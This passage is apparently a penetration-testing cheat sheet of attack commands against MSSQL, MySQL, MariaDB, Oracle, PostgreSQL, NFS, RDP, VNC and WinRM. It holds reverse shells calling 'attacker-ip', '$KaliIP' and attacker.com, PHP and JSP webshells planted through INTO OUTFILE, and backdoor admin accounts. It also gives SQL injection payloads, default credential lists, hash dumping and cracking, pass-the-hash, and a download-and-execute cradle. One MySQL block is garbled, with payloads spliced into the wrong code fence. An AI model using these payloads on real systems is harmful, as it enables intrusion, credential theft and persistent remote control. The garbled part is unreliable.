> EXEC xp_cmdshell 'powershell -c "$client = New-Object System.Net.Sockets.TCPClient(''attacker-ip'',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + ''PS '' + (pwd).Path + ''> '';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"';
> ```
### Lateral Movement
> - Domain Enumeration
> - Enumerate domain users
> ```sql
> EXEC xp_cmdshell 'net user /domain';
> EXEC xp_cmdshell 'net group "Domain Admins" /domain';
> ```
> - Enumerate shares
> ```sql
> EXEC xp_cmdshell 'net view \\target-host';
> ```
> - Remote Execution
> ```sql
> EXEC xp_cmdshell 'psexec \\target-host -u domain\admin -p password cmd.exe';
> ```
> - WMI lateral movement
> ```sql
> EXEC xp_cmdshell 'wmic /node:target-host process call create "cmd.exe /c payload.exe"';
> ```

---

## MySQL

**Common Commands**

| Command            | Description             | Usage                                |
|--------------------|-------------------------|--------------------------------------|
| SHOW DATABASES;    | Lists all databases     | SHOW DATABASES;                     |
| USE                | Switch to database      | USE database_name;                  |
| SHOW TABLES;       | Display all tables      | SHOW TABLES;                        |
| SELECT             | Retrieve data           | SELECT * FROM table_name;           |
| INSERT INTO        | Insert record           | INSERT INTO table (col1) VALUES (val1); |
| UPDATE             | Update records          | UPDATE table SET col1=val1 WHERE condition; |
| DELETE FROM        | Delete records          | DELETE FROM table WHERE condition;  |
| CREATE USER        | Create new user         | CREATE USER 'user'@'host' IDENTIFIED BY 'pass'; |
| GRANT              | Grant privileges        | GRANT ALL ON db.* TO 'user'@'host'; |
| FLUSH PRIVILEGES;  | Reload privileges       | FLUSH PRIVILEGES;                   |
| LOAD_FILE()        | Read file               | SELECT LOAD_FILE('/etc/passwd');    |
| INTO OUTFILE       | Write to file           | SELECT * INTO OUTFILE '/tmp/file.txt'; |

**Connecting**
### Using MySQL client
> - Local connection (no password)
> ```bash
> mysql -u root
> ```
> - Local connection with password
> ```bash
> mysql -u username -p
> ```
> - Connect to specific database
> ```bash
> mysql -u username -p database_name
> ```
> - Remote connection
> ```bash
> mysql -u username -h target.com -P 3306 -p
> ```
> - Connect and execute query
> ```bash
> mysql -u username -p -e "SELECT @@version;"
> ```
> - Connect without database selection
> ```bash
> mysql -u username -h target.com -p --skip-database
> ```
### Using mysqldump
> - Dump specific database
> ```bash
> mysqldump -u username -p database_name > backup.sql
> ```
> - Dump all databases
> ```bash
> mysqldump -u username -p --all-databases > all_databases.sql
> ```
> - Dump specific table
> ```bash
> mysqldump -u username -p database_name table_name > table.sql
> ```
> - Remote dump
> ```bash
> mysqldump -u username -h target.com -p database_name > remote_backup.sql
> ```
**Enumeration**
### Version Detection
> - MySQL version
> ```sql
> SELECT @@version;
> SELECT VERSION();
> ```
> - Server information
> ```sql
> SELECT @@version_compile_os;
> SELECT @@version_compile_machine;
> ```
> - Detailed version info
> ```sql
> SHOW VARIABLES LIKE "%version%";
> ```
### Database
> - List all databases
> ```sql
> SHOW DATABASES;
> SELECT SCHEMA_NAME FROM information_schema.SCHEMATA;
> ```
> - Current database
> ```sql
> SELECT DATABASE();
> ```
> - Database size
> ```sql
> SELECT 
>  table_schema AS 'Database',
>  ROUND(SUM(data_length + index_length) / 1024 / 1024, 2) AS 'Size (MB)'
> FROM information_schema.TABLES 
> GROUP BY table_schema;
> ```
### Users
> - List MySQL users
> ```sql
> SELECT user, host FROM mysql.user;
> ```
> - Current user
> ```sql
> SELECT USER();
> SELECT CURRENT_USER();
> ```
> - User privileges
> ```sql
> SHOW GRANTS;
> SHOW GRANTS FOR 'username'@'host';
> ```
> - List users with FILE privilege
> ```sql
> SELECT user, host FROM mysql.user WHERE File_priv = 'Y';
> ```
> - List users with SUPER privilege
> ```sql
> SELECT user, host FROM mysql.user WHERE Super_priv = 'Y';
> ```
### Table and Columns
> - List tables in current database
> ```sql
> SHOW TABLES;
> SELECT table_name FROM information_schema.TABLES WHERE table_schema=DATABASE();
> ```
> - List columns in specific table
> ```sql
> SHOW COLUMNS FROM table_name;
> SELECT column_name, data_type FROM information_schema.COLUMNS WHERE table_name='users';
> ```
> - Find sensitive columns
> ```sql
> SELECT table_name, column_name FROM information_schema.COLUMNS 
> WHERE column_name LIKE '%password%' 
>   OR column_name LIKE '%pass%'
>   OR column_name LIKE '%pwd%'
>   OR column_name LIKE '%secret%'
>   OR column_name LIKE '%token%';
> ```
> - Count rows in tables
> ```sql
> SELECT table_name, table_rows FROM information_schema.TABLES 
> WHERE table_schema = DATABASE();
> ```
### Privileges
> - Check FILE privilege (for LOAD_FILE/INTO OUTFILE)
> ```sql
> SELECT file_priv FROM mysql.user WHERE user='current_user';
> ```
> - Check for dangerous privileges
> ```sql
> SELECT user, host, Select_priv, Insert_priv, Update_priv, Delete_priv, 
>       Create_priv, Drop_priv, File_priv, Super_priv 
> FROM mysql.user;
> ```
> - Current user permissions
> ```sql
> SELECT * FROM information_schema.USER_PRIVILEGES WHERE grantee LIKE '%username%';
> ```
### Configuration
> - Important variables
> ```sql
> SHOW VARIABLES;
> SHOW VARIABLES LIKE 'secure_file_priv';  # File operations directory
> SHOW VARIABLES LIKE 'plugin_dir';        # Plugin directory
> SHOW VARIABLES LIKE 'datadir';           # Data directory
> SHOW VARIABLES LIKE 'basedir';           # Base directory
> ```
> - Check if local_infile enabled
> ```sql
> SHOW VARIABLES LIKE 'local_infile';
> ```
> - Process list
> ```sql
> SHOW PROCESSLIST;
> ```
### File Operations
> - Read Files
> ```sql
> SELECT LOAD_FILE('/etc/passwd');
> SELECT LOAD_FILE('/var/www/html/config.php');
> SELECT LOAD_FILE('C:\\Windows\\win.ini');
> ```
> - Read file with hex encoding (bypasses binary issues)
> ```sql
> SELECT HEX(LOAD_FILE('/etc/passwd'));
> ```
> - Write Files
> ```sql
> SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
> SELECT 'backdoor content' INTO OUTFILE '/tmp/backdoor.txt';
> ```
> - Checking restrictions
> ```sql
> SHOW VARIABLES LIKE 'secure_file_priv';
> ```
### User Defined Functions (UDF) for RCE
> - Create malicious UDF library
> - First, create the UDF shared library (compiled C code)
> - Then load it into MySQL
> - Upload UDF library using INTO DUMPFILE
> ```sql
> SELECT 0x[hex_encoded_library] INTO DUMPFILE '/usr/lib/mysql/plugin/udf_sys_exec.so';
> ```
> - Using Union
> ```sql
> 
> - Create function
> ```sql
> CREATE FUNCTION sys_exec RETURNS int SONAME 'udf_sys_exec.so';
> ```' union select '<?php system($_GET["cmd"]); ?>' into outfile '/srv/http/shell.php' -- -
> ```
> - Windows Payload
> ```sql
> SELECT "<?php system($_GET['cmd']);?>" INTO OUTFILE "C:/wamp/www/shell.php"
> ```
> - Execute commands
> ```sql
> SELECT sys_exec('whoami');
> SELECT sys_exec('id');
> SELECT sys_exec('bash -i >& /dev/tcp/attacker-ip/4444 0>&1');
> ```
> - Alternative: sys_eval to get output
> ```sql
> CREATE FUNCTION sys_eval RETURNS string SONAME 'udf_sys_exec.so';
> SELECT sys_eval('cat /etc/passwd');
> ```
- Uploading webshell
> - PHP webshell
> ```sql
> SELECT '<?php system($_GET["cmd"]); ?>' 
> INTO OUTFILE '/var/www/html/shell.php';
> ```
> - Access: http://target.com/shell.php?cmd=whoami

> - More sophisticated webshell
> ```sql
> SELECT '<?php
> if(isset($_REQUEST["cmd"])){
>    $cmd = $_REQUEST["cmd"];
>    echo "<pre>";
>    $result = shell_exec($cmd);
>    echo $result;
>    echo "</pre>";
>}
>?>' INTO OUTFILE '/var/www/html/advanced-shell.php';
> ```
> - JSP webshell (if applicable)
> ```sql
> SELECT '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>' 
> INTO OUTFILE '/var/www/html/shell.jsp';
> ```
- Privilege Escalation
> ```sql
> - Create new admin user
> CREATE USER 'backdoor'@'%' IDENTIFIED BY 'P@ssw0rd123!';
> GRANT ALL PRIVILEGES ON *.* TO 'backdoor'@'%' WITH GRANT OPTION;
> FLUSH PRIVILEGES;
> ```
> - Modify existing user password
> ```sql
> UPDATE mysql.user SET password=PASSWORD('newpassword') WHERE user='root';
> FLUSH PRIVILEGES;
> ```
> - Grant FILE privilege to user
> ```sql
> GRANT FILE ON *.* TO 'username'@'localhost';
> FLUSH PRIVILEGES;
> ```
#### Hash extraction and cracking
> - Extract password hashes (MySQL < 5.7)
> ```sql
> SELECT user, password FROM mysql.user;
> ```
> - Extract password hashes (MySQL >= 5.7)
> ```sql
> SELECT user, authentication_string FROM mysql.user;
> ```
> - Specific user hash
> ```sql
> SELECT authentication_string FROM mysql.user WHERE user='root';
> ```
> - Export hashes to file
> ```sql
> SELECT user, authentication_string FROM mysql.user 
> INTO OUTFILE '/tmp/hashes.txt';
> ```
> - Extract hashes
> ```bash
> mysql -u root -p -e "SELECT CONCAT(user, ':', authentication_string) FROM mysql.user" > mysql_hashes.txt
> ```
> - Crack with hashcat (MySQL 4.1/MySQL 5+)
> ```bash
> hashcat -m 300 mysql_hashes.txt rockyou.txt
> ```
> - Crack with John the Ripper
> ```bash
> john --format=mysql-sha1 mysql_hashes.txt
> ```
> - Old MySQL (pre-4.1)
> ```bash
> hashcat -m 200 old_mysql_hash.txt rockyou.txt
> ```
- Data exfiltration
> - Extract sensitive data
> ```sql
> SELECT * FROM users WHERE role='admin';
> SELECT username, password, email FROM accounts;
> SELECT * FROM credit_cards;
> SELECT * FROM personal_information;
> ```
> - Export database to file
> ```sql
> SELECT * FROM sensitive_table 
> INTO OUTFILE '/tmp/exfiltrated_data.csv'
> FIELDS TERMINATED BY ',' 
> ENCLOSED BY '"'
> LINES TERMINATED BY '\n';
> ```
> - Concatenate and export
> ```sql
> SELECT CONCAT(username, ':', password) FROM users 
> INTO OUTFILE '/tmp/credentials.txt';
> ```

---

## MariaDB

> - Basic SQL Injection
> ```sql
> admin ' OR 1=1 -- 
> ```
> - Alternative Syntax
> ```sql
> 1' OR 1 = 1 #
> ```
> - Union-Based Data Extraction (Column Guessing)
> ```sql
> ' UNION SELECT 1,2,3,4 FROM information_schema.tables WHERE table_schema=database()-- 
> ```
> - Extract Table and Column Information
> ```sql
> ' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database()-- 
> ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='<table_name>'-- 
> ```
> - Extract Data from Target Table
> ```sql
> ' UNION SELECT <column1>, <column2> FROM <table_name>--
> ```

---

## Oracle

**Common Credentials**

| Username          | Password          |
|-------------------|-------------------|
| sys               | change_on_install |
| system            | manager           |
| system            | oracle            |
| scott             | tiger             |
| dbsnmp            | dbsnmp            |
| sysman            | sysman            |
| admin             | admin             |

> - Union SQL Injection with dual Table: Oracle databases often use the dual table for testing purposes.
> ```sql
> ' UNION SELECT 1,2,3,4,5 FROM dual-- 
> ```
> Correcting Number of Columns: adjust the number of columns to avoid errors.
> ```sql
> ' UNION SELECT 1,2,3 FROM dual-- 
> ```
> - Retrieve User Information: extract usernames from Oracle’s internal tables.
> ```sql
> ' UNION SELECT username, NULL, NULL FROM all_users-- 
> ```
> - Dump Table and Column Names: extract table names and column names from the Oracle database.
> ```sql
> ' UNION SELECT table_name, NULL, NULL FROM all_tables-- 
> ' UNION SELECT column_name, NULL, NULL FROM all_tab_columns WHERE table_name='<table_name>'-- 
> ```
> Dump Data from Table: finally, retrieve specific data from a target table.
> ```sql
> ' UNION SELECT <column_name>, NULL FROM <table_name>-- 
> ```
> - Example of bypassing Oracle DB login:
> ```sql
> admin ' OR 1=1 -- 
> ```
> - System privileges for current user
> ```sql
> SELECT * FROM session_privs;
> ```
> - All system privileges
> ```sql
> SELECT * FROM dba_sys_privs WHERE grantee='USERNAME';
> ```
> - Role privileges
> ```sql
> SELECT * FROM dba_role_privs WHERE grantee='USERNAME';
> ```
> - Table privileges
> ```sql
> SELECT * FROM dba_tab_privs WHERE grantee='USERNAME';
> ```
> - Check for DBA role
> ```sql
> SELECT granted_role FROM user_role_privs WHERE granted_role='DBA';
> ```
> - Extract password hashes (Oracle 10g)
> ```sql
> SELECT name, password FROM sys.user$;
> ```
> - Extract password hashes (Oracle 11g+)
> ```sql
> SELECT name, spare4 FROM sys.user$;
> ```
> - Both versions
> ```sql
> SELECT username, password, spare4 FROM dba_users;
> ```
> - Password versions
> ```sql
> SELECT username, password_versions FROM dba_users;
> ```

---

## NFS

| Version | Features                      | Security           |
|---------|-------------------------------|--------------------|
| NFSv2   | Basic functionality           | Weak security      |
| NFSv3   | Better performance             | AUTH_SYS only      |
| NFSv4   | ACLs, better security         | Kerberos support   |

**using Mount**
> - List NFS shares
> ```bash
> showmount -e target.com
> ```
> - Mount NFS share
> ```bash
> mkdir /mnt/nfs
> mount -t nfs target.com:/share /mnt/nfs
> ```
> - Mount with specific NFS version
> ```bash
> mount -t nfs -o vers=3 target.com:/share /mnt/nfs
> mount -t nfs -o vers=4 target.com:/share /mnt/nfs
> ```
> - Mount without root squashing
> ```bash
> mount -t nfs -o nolock target.com:/share /mnt/nfs
> ```
> - Read-only mount
> ```bash
> mount -t nfs -o ro target.com:/share /mnt/nfs
> ```
> - Unmount
> ```bash
> umount /mnt/nfs
> ```
**Share Enumeration**
#### Using showmount
> - List exported shares
> ```bash
> showmount -e target.com
> ```
> - List directories
> ```bash
> showmount -d target.com
> ```
> - List clients
> ```bash
> showmount -a target.com
> ```
- Using rpcinfo
> - Using rpcinfo
> ```bash
> rpcinfo -p target.com
> ```
> - Manual RPC query
> ```bash
> rpcinfo target.com | grep nfs
> ```
#### Exploration
> - Mount share
> ```bash
> mount -t nfs target.com:/share /mnt/nfs
> ```
> - List contents
> ```bash
> ls -la /mnt/nfs
> ```
> - Find interesting files
> ```bash
> find /mnt/nfs -type f -name "*.conf"
> find /mnt/nfs -type f -name "*.key"
> find /mnt/nfs -type f -name "*.pem"
> find /mnt/nfs -type f -name "*password*"
> find /mnt/nfs -type f -name "*.env"
> ```
> - Search for credentials
> ```bash
> grep -r "password\|secret\|key" /mnt/nfs
> ```
> - Check permissions
> ```bash
> ls -la /mnt/nfs
> ```

---

## RDP

> - Password Spray
> ```bash
> crowbar -b rdp -s <target_ip>/32 -U users.txt -C rockyou.txt
> ```
- Logging In
> - Basic Connection to xfreerdp3
> ```bash
> xfreerdp3 /cert:ignore /dynamic-resolution +clipboard /drive:Downloads,/home/username/Downloads /u:'<username>' /p:'<password>' /v:<IP>
> ```
> - Connect using xfreerdp with various options
> ```bash
> xfreerdp /cert-ignore /bpp:8 /compression /themes /wallpaper /auto-reconnect /h:1000 /w:1600 /v:<IP> /u:<username> /p:<password>
> ```
> - Connect with a drive mapping and increased timeout
> ```bash
> xfreerdp /u:<username> /v:<IP> /cert:ignore /p:<password> /timeout:20000 /drive:<drive_name>,<local_path>
> ```
> - Connect with clipboard support and set resolution
> ```bash
> xfreerdp /compression +auto-reconnect /u:$USER/p:$PASSWORD /v:<ip> +clipboard /size:1920x1080 /drive:desktop,/home/$YOUR_USERNAME/Desktop
> ```
> - Connect using rdesktop with credentials
> ```bash
> rdesktop -u $USER -p $PASSWORD -g 1920x1080 <ip>
> ```
> - Connect using rdesktop without credentials
> ```bash
> rdesktop <ip>
> ```

# Enable RDP If Disabled

## Check RDP Status

```powershell
$ComputerName = hostname
(Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -ComputerName $ComputerName -Filter "TerminalName='RDP-tcp'").UserAuthenticationRequired
# If result is 1 then RDP is disabled
```

## Set the NLA Information to Disabled to Allow RDP

```powershell
(Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -ComputerName $ComputerName -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(0)
```

## Set the NLA Information to Enabled to Deny RDP

```powershell
(Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -ComputerName $ComputerName -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(1)
```

## Enable RDP for the Whole Workstation

```powershell
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
```

## Enable RDP for a Specific User (No Active Directory)

```powershell
Add-LocalGroupMember -Group "Remote Desktop Users" -Member "[username]"
```

## Enable RDP for a Specific User (Active Directory)

### Option 1: Using AD User

```powershell
Add-ADGroupMember -Identity "Remote Desktop Users" -Members "[domain]\[username]"
```

### Option 2: Using `net`

```powershell
net localgroup "Remote Desktop Users" "[domain]\[username]" /add
```

## Check the Firewall Status

```powershell
# This is done because if a firewall is configured, it may cause issues for RDP

# Get status: if True, the rule is enabled and RDP should work
Get-NetFirewallRule -DisplayGroup "Remote Desktop"
```

### Enable RDP Firewall Rule If Disabled

```powershell
# Enable the rule if it's disabled, ensuring traffic via port 3389 is not blocked
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
```

## (Alternative) Create a New User for RDP (Requires Admin Privileges)

### 1. Create the New User

```powershell
New-ADUser -Name "[username]" -AccountPassword (ConvertTo-SecureString "P@ssword123!" -AsPlainText -Force) -Enabled $true
```

### 2. Confirm That the User Was Created Successfully

```powershell
Get-NetUser | select cn
```

### 3. Add User to RDP Group

```powershell
# Must be run as admin
Add-ADGroupMember -Identity "Remote Management Users" -Members [username]
```

### 4. Add User to Administrators Group

```powershell
# Must be run as admin
Add-ADGroupMember -Identity "Administrators" -Members [username]
```

### 5. Enable RDP Usage

```powershell
# Enable RDP
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -Value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
```

### 6. Connect to RDP

```bash
rdesktop -u [username] -p 'P@ssword123!' -d [domain.com] [victim_ip]
```

---

## PostgreSQL

**Common Commands**

| Command                  | Description          | Usage                          |
|--------------------------|----------------------|--------------------------------|
| \l                       | List databases       | \l                             |
| \c                       | Connect to database  | \c database_name              |
| \dt                       | List tables          | \dt                            |
| \d table                  | Describe table       | \d users                       |
| \du                       | List users           | \du                            |
| \dn                       | List schemas         | \dn                            |
| \df                       | List functions       | \df                            |
| \dx                       | List extensions      | \dx                            |
| \q                        | Quit psql            | \q                             |
| SELECT version();         | Get version          | SELECT version();             |
| SELECT current_user;      | Current user         | SELECT current_user;          |
| SELECT current_database();| Current database     | SELECT current_database();    |

**Connecting**
> - Local connection
> ```bash
> psql -U username
> ```
> - Remote connection
> ```bash
> psql -h target.com -p 5432 -U username -d database_name
> ```
> - Connect without specifying database
> ```bash
> psql -h target.com -U postgres
> ```
> - Connection with password
> ```bash
> psql -h target.com -U username -W
> ```
> - Execute command directly
> ```bash
> psql -h target.com -U username -d database_name -c "SELECT version();"
> ```
> - Execute commands from file
> ```bash
> psql -h target.com -U username -d database_name -f script.sql
> ```
# Version Detection

### PostgreSQL version
> ```sql
> SELECT version();
> ```

### Server version number
> ```sql
> SHOW server_version;
> SHOW server_version_num;
> ```

### Detailed version info
> ```sql
> SELECT current_setting('server_version');
> ```

# Database Enumeration

### List all databases
> ```sql
> \l
> SELECT datname FROM pg_database;
> ```

### Current database
> ```sql
> SELECT current_database();
> ```

### Database owner
> ```sql
> SELECT pg_catalog.pg_get_userbyid(d.datdba) AS owner, datname 
> FROM pg_catalog.pg_database d;
> ```

### Database size
> ```sql
> SELECT pg_database.datname, 
>       pg_size_pretty(pg_database_size(pg_database.datname)) AS size 
> FROM pg_database;
> ```

### Number of connections per database
> ```sql
> SELECT datname, count(*) FROM pg_stat_activity GROUP BY datname;
> ```

# User Enumeration

### List all users
> ```sql
> \du
> SELECT usename FROM pg_user;
> SELECT usename, usesysid FROM pg_shadow;
> ```

### Current user
> ```sql
> SELECT current_user;
> SELECT user;
> SELECT session_user;
> ```

### User privileges
> ```sql
> SELECT usename, usecreatedb, usesuper FROM pg_user;
> ```

### Superusers
> ```sql
> SELECT usename FROM pg_user WHERE usesuper = true;
> ```

### Users with create database privilege
> ```sql
> SELECT usename FROM pg_user WHERE usecreatedb = true;
> ```

# Schema and Table Enumeration

### List schemas
> ```sql
> \dn
> SELECT schema_name FROM information_schema.schemata;
> ```

### List tables in current database
> ```sql
> \dt
> SELECT table_name FROM information_schema.tables WHERE table_schema='public';
> ```

### List all tables across all schemas
> ```sql
> SELECT schemaname, tablename FROM pg_tables;
> ```

### List columns in specific table
> ```sql
> \d table_name
> SELECT column_name, data_type FROM information_schema.columns 
> WHERE table_name='users';
> ```

### Find sensitive columns
> ```sql
> SELECT table_schema, table_name, column_name 
> FROM information_schema.columns 
> WHERE column_name LIKE '%password%' 
>   OR column_name LIKE '%pass%'
>   OR column_name LIKE '%secret%'
>   OR column_name LIKE '%token%'
>   OR column_name LIKE '%key%';
> ```

### Count rows in tables
> ```sql
> SELECT schemaname, relname, n_live_tup 
> FROM pg_stat_user_tables 
> ORDER BY n_live_tup DESC;
> ```

# Privilege Enumeration

### Current user privileges
> ```sql
> \du+
> ```

### Table privileges for current user
> ```sql
> SELECT grantee, privilege_type 
> FROM information_schema.table_privileges 
> WHERE grantee = current_user;
> ```

### Check if superuser
> ```sql
> SELECT usesuper FROM pg_user WHERE usename = current_user;
> ```

### Check file read/write permissions
> ```sql
> # Requires pg_read_file/pg_write_file functions
> SELECT has_function_privilege('pg_read_file(text)', 'execute');
> SELECT has_function_privilege('pg_ls_dir(text)', 'execute');
> ```

# Function and Extension Enumeration

### List installed extensions
> ```sql
> \dx
> SELECT extname, extversion FROM pg_extension;
> ```

### List functions
> ```sql
> \df
> SELECT proname FROM pg_proc WHERE proname !~ '^pg_';
> ```

### List large objects
> ```sql
> \lo_list
> SELECT oid, pg_size_pretty(lo_get(oid)) FROM pg_largeobject_metadata;
> ```

### Check for dangerous functions
> ```sql
> SELECT proname FROM pg_proc 
> WHERE proname IN ('pg_read_file', 'pg_ls_dir', 'pg_read_binary_file');
> ```

# Configuration Enumeration

### Important settings
> ```sql
> SHOW all;
> SHOW data_directory;
> SHOW config_file;
> SHOW hba_file;
> SHOW log_directory;
> ```

### File locations
> ```sql
> SELECT name, setting FROM pg_settings WHERE name LIKE '%file%' OR name LIKE '%dir%';
> ```

### Logging settings
> ```sql
> SELECT name, setting FROM pg_settings WHERE name LIKE 'log%';
> ```

### Connection settings
> ```sql
> SELECT name, setting FROM pg_settings WHERE category = 'Connections and Authentication';
> ```

# SQL Injection
### Error-based injection
> ```sql
> ' AND 1=CAST((SELECT version()) AS int)--
> ````
### Union-based injection
> ```sql
> ' UNION SELECT NULL, version(), NULL--
> ' UNION SELECT NULL, current_database(), NULL--
> ```
### Boolean-based blind
> ```sql
> ' AND (SELECT COUNT(*) FROM pg_user WHERE usename='postgres')=1--
> ```
### Time-based blind
> ```sql
> ' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--
> '; SELECT pg_sleep(5)--
> ```
### Stacked queries (if supported)
> ```sql
> '; DROP TABLE test_table;--
> ```

### Code Execution
> ```sql  
> DROP TABLE IF EXISTS cmd_exec;  
> CREATE TABLE cmd_exec(cmd_output text);  
> COPY cmd_exec FROM PROGRAM 'id';  
> SELECT * FROM cmd_exec;  
> DROP TABLE IF EXISTS cmd_exec;
> ```
### Reverse Shell
> ```sql
> DROP TABLE IF EXISTS cmd_exec;  
> CREATE TABLE cmd_exec(cmd_output text);
> COPY cmd_exec FROM PROGRAM 'sh -i >& /dev/tcp/$KaliIP/8080 0>&1';
> SELECT * FROM cmd_exec;  
> DROP TABLE IF EXISTS cmd_exec;
> ```

# Other Useful commands
### Query the contents of a specific table
> ```sql
> SELECT * FROM <TABLE_NAME>;
> ```
### Get detailed information about a table, including columns and their types
> ```sql
> \d+ <TABLE_NAME>
> ```
### Execute a query to find specific data, such as users with a particular attribute
> ```sql
> SELECT * FROM users WHERE attribute = 'value';
> ```
### Example command to list all tables and their columns
> ```sql
> SELECT table_name, column_name, data_type
> FROM information_schema.columns
> WHERE table_schema = 'public';
> ```
### Execute an SQL command to create a new table
> ```sql
> CREATE TABLE test_table (
>      id SERIAL PRIMARY KEY,
>      name VARCHAR(100),
>      created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
>    );
> ```
### Insert data into a table
> ```sql
> INSERT INTO test_table (name) VALUES ('example_data');
> ```
### Update data in a table
> ```sql
> UPDATE test_table SET name = 'updated_data' WHERE id = 1;
> ```
### Delete data from a table
> ```sql
> DELETE FROM test_table WHERE id = 1;
> ```

---

## VNC

### Basic Connection
```bash
vncviewer <ip>:5900
```

### More Detailed Connection with Authentication
```bash
vncviewer -passwd /path/to/passwordfile <ip>:5900
```

# Common Default Credentials

- No Password
- `vnc`
- `1234`

# Usage Once Connected

1. Explore the filesystem
2. Run commands
3. Capture screenshots with `scrot`
4. Manipulate files

---

## WinRM

#### Connecting using Powershell

### Create credentials
> ```powershell
> $password = ConvertTo-SecureString "password" -AsPlainText -Force
> $cred = New-Object System.Management.Automation.PSCredential("administrator", $password)
> ```
### Connect interactively
> ```powershell
> Enter-PSSession -ComputerName target.com -Credential $cred
> ```
### Run command remotely
> ```powershell
> Invoke-Command -ComputerName target.com -Credential $cred -ScriptBlock { whoami }
> ```
### Connect to multiple machines
> ```powershell
> $computers = "server1", "server2", "server3"
> Invoke-Command -ComputerName $computers -Credential $cred -ScriptBlock { hostname }
> ```

#### Enumeration

# User Enumeration

### List local users
> ```powershell
> Get-LocalUser
> ```

### List domain users (if domain-joined)
> ```powershell
> Get-ADUser -Filter *
> ```

### Get current user
> ```powershell
> whoami
> $env:USERNAME
> ```

### Get user groups
> ```powershell
> whoami /groups
> Get-LocalGroup
> Get-ADGroupMember "Domain Admins"
> ```

# System Information

### System information
> ```powershell
> systeminfo
> Get-ComputerInfo
> ```

### OS version
> ```powershell
> [System.Environment]::OSVersion
> Get-WmiObject Win32_OperatingSystem
> ```

### Architecture
> ```powershell
> [System.Environment]::Is64BitOperatingSystem
> $env:PROCESSOR_ARCHITECTURE
> ```

### Hostname
> ```powershell
> hostname
> $env:COMPUTERNAME
> ```

### Domain information
> ```powershell
> Get-WmiObject Win32_ComputerSystem | Select Domain
> ```

# Network Enumeration

### Network interfaces
> ```powershell
> ipconfig /all
> Get-NetIPAddress
> Get-NetIPConfiguration
> ```

### Routing table
> ```powershell
> route print
> Get-NetRoute
> ```

### ARP table
> ```powershell
> arp -a
> Get-NetNeighbor
> ```

### Active connections
> ```powershell
> netstat -ano
> Get-NetTCPConnection
> ```

### DNS cache
> ```powershell
> ipconfig /displaydns
> Get-DnsClientCache
> ```

# Process and Service Enumeration

### List running processes
> ```powershell
> Get-Process
> tasklist /v
> ```

### Enumerate Windows services
> ```powershell
> Get-Service
> sc query
> ```

### List scheduled tasks
> ```powershell
> Get-ScheduledTask
> schtasks /query /fo LIST /v
> ```

### List startup programs
> ```powershell
> Get-CimInstance Win32_StartupCommand
> wmic startup get caption,command
> ```

# Share Enumeration

### List shares
> ```powershell
> net share
> Get-SmbShare
> Get-WmiObject Win32_Share
> ```

### Access shares
> ```powershell
> net use \\target\share
> Get-SmbMapping
> ```

### Find accessible shares on network
> ```powershell
> Get-SmbShare -CimSession (Get-ADComputer -Filter *).Name
> ```

# Using evil-winrm with NTLM hash
> ```bash
> evil-winrm -i target.com -u administrator -H '32ed87bdb5fdc5e9cba88547376818d4'
> ```

# Using crackmapexec
> ```bash
> crackmapexec winrm target.com -u administrator -H '32ed87bdb5fdc5e9cba88547376818d4'
> ```

**Powershell Remoting**

| Cmdlet          | Description             | Example                                         |
|-----------------|-------------------------|-------------------------------------------------|
| Enter-PSSession | Interactive remote session | `Enter-PSSession -ComputerName target`         |
| Exit-PSSession  | Exit remote session     | `Exit-PSSession`                                |
| Invoke-Command  | Run command remotely    | `Invoke-Command -ComputerName target -ScriptBlock {cmd}` |
| New-PSSession   | Create persistent session | `$s = New-PSSession -ComputerName target`       |
| Remove-PSSession| Close session           | `Remove-PSSession -Session $s`                 |
| Get-PSSession   | List active sessions    | `Get-PSSession`     

**Evil-winrm commands**

| Command        | Description                  | Usage                                       |
|----------------|------------------------------|---------------------------------------------|
| upload         | Upload file to target         | `upload /local/file.exe C:\Windows\Temp\file.exe` |
| download       | Download file from target     | `download C:\file.txt /tmp/file.txt`       |
| services       | List services                 | `services`                                 |
| menu           | Show available commands       | `menu`                                     |
| Bypass-4MSI    | Bypass AMSI                   | `Bypass-4MSI`                              |
| Invoke-Binary  | Execute binary from memory    | `Invoke-Binary /path/to/binary.exe` 

**Pass-the-Hash**

### Using evil-winrm with NTLM hash
> ```bash
> evil-winrm -i target.com -u administrator -H '32ed87bdb5fdc5e9cba88547376818d4'
> ```
### Using crackmapexec
> ```bash
> crackmapexec winrm target.com -u administrator -H '32ed87bdb5fdc5e9cba88547376818d4'
> ```

**Command Execution**

### Basic command execution
> ```powershell
> Invoke-Command -ComputerName target.com -ScriptBlock { whoami }
> ```
### Multiple commands
> ```powershell
> Invoke-Command -ComputerName target.com -ScriptBlock {
>  whoami
>  hostname
>  ipconfig
>}
> ```
### Execute local script on remote
> ```powershell
> Invoke-Command -ComputerName target.com -FilePath .\script.ps1
> ```
### Download and execute
> ```powershell
> Invoke-Command -ComputerName target.com -ScriptBlock {
>  IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')
>}
> ```

**Privilege Execution**

#### Check privileges
> ```cmd
> whoami /priv
> ```
#### Check for unquoted service paths
> ```cmd
> wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """
> ```
